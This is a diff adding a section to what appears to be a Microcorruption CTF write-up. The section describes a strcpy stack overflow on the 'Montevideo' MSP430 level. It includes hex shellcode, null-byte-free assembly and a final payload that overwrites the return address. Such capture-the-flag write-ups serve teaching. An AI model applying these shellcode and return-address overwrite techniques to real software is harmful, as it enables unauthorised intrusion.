@@ -179,6 +179,37 @@ right on the stack and then had the return go directly to the INT() function its
 
 ## Montevideo
 
+While the password isn't read directly onto the stack at first, it is copied using an unsafe
+strcpy.  Only 16 bytes of stack space are reserved.  Put our INT call shell code in the buffer
+and then lets have it return to our shell code.
+
+```
+30127f00b0124c45090a0b0c0d0e0f10ee43
+```
+
+Doh.  The 0x0 in the shell code prevented strcpy from copying the shell code the came afterwords.
+I need to rewrite the shell code without 0x0s anywhere. (Or the alternative solution from the
+problem before would work well here, but what is the fun in that?)
+
+```
+mov #0x108f, r5
+sub #0x1010, r5       # r5 = 0x007f
+push r5
+call #0x454c
+```
+
+Using the assembler, I get...
+
+```
+35408f10358010100512b0124c45
+```
+
+Pad out the rest of the buffer, and then make the return address the start of the buffer (0x43ee).
+
+```
+35408f10358010100512b0124c450f10ee43
+```
+
 ## Johannesburg
 
 ## Santa Cruz
